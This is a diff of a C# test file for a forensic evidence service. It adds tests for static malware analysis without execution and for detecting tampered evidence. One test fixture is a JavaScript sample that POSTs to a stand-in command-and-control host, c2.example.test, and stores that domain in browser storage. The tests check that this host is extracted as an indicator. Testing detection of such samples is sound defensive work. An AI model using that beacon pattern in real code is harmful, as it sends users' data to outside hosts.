@@ -2,6 +2,7 @@ using System.Security.Cryptography;
 using System.Text;
 using AtlasForense.Models;
 using AtlasForense.Services;
+using AtlasForense.Forensics;
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.AspNetCore.Http;
 using Microsoft.Extensions.FileProviders;
@@ -17,7 +18,7 @@ public sealed class ForensicCaseServiceTests : IDisposable
     public ForensicCaseServiceTests()
     {
         Directory.CreateDirectory(_root);
-        _service = new JsonForensicCaseService(new TestEnvironment(_root));
+        _service = new JsonForensicCaseService(new TestEnvironment(_root), [new StaticTextAnalyzer()]);
     }
 
     [Fact]
@@ -141,6 +142,48 @@ public sealed class ForensicCaseServiceTests : IDisposable
         var result = await Acquire(item.Id, "empty.bin", Array.Empty<byte>());
         Assert.False(result.Success);
         Assert.Empty(_service.Get(item.Id)!.Evidence);
+    }
+
+    [Fact]
+    public async Task StaticAnalysis_ExtractsIocsFunctionsAndCapabilitiesWithoutExecutingSample()
+    {
+        var script = "async function sendData(){ return fetch('https://c2.example.test/request/auth.php', {method:'POST'}); } localStorage.setItem('domain','c2.example.test');";
+        var item = await CreateCase();
+        await Authorize(item.Id);
+        await Acquire(item.Id, "sample.js", script);
+        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
+        var evidence = item.Evidence.Single();
+
+        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);
+
+        Assert.True(result.Success, result.Message);
+        var analyzed = _service.Get(item.Id)!;
+        var run = Assert.Single(analyzed.AnalysisRuns);
+        Assert.True(run.NetworkBlocked);
+        Assert.False(run.SampleExecuted);
+        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Url && x.Value.Contains("c2.example.test"));
+        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Domain && x.Value == "c2.example.test");
+        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.ScriptFunction && x.Value == "sendData");
+        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Network request");
+        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Browser storage");
+    }
+
+    [Fact]
+    public async Task StaticAnalysis_BlocksTamperedEvidenceAndAuditsIntegrityFailure()
+    {
+        var item = await CreateCase();
+        await Authorize(item.Id);
+        await Acquire(item.Id, "sample.js", "function clean() { return true; }");
+        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
+        var evidence = item.Evidence.Single();
+        var path = Path.Combine(_root, "App_Data", "Evidence", item.Id.ToString("N"), evidence.StoredFileName);
+        await File.AppendAllTextAsync(path, "tampered");
+
+        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);
+
+        Assert.False(result.Success);
+        Assert.Empty(item.AnalysisRuns);
+        Assert.Contains(item.AuditTrail, x => x.Action == "INTEGRITY_FAILURE");
     }
 
     private Task<ForensicCase> CreateCase() => _service.CreateAsync(new CreateCaseInput { Title = "Validated case", RequestingOrganization = "Forensic Lab", LeadExaminer = "Examiner A", Scope = "Known test data only" }, default);
